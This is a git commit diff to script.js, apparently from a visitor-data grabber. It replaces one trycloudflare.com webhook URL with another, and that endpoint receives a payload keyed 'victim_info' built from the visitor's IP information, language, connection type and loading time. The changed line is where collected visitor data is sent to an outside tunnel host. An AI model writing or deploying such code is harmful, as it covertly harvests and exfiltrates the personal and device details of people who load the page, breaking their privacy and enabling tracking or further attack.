05dfdd1590017cc0b3f7b4399f53a8a813e48bca
Elysioxx <108831238+elyelysiox@users.noreply.github.com>
2025-05-04 01:42:03 -0500

    update file

--- script.js
+++ script.js
@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://trinity-eat-sie-elizabeth.trycloudflare.com/userData";
+                const webhookURL = "https://due-procedure-brunei-loans.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
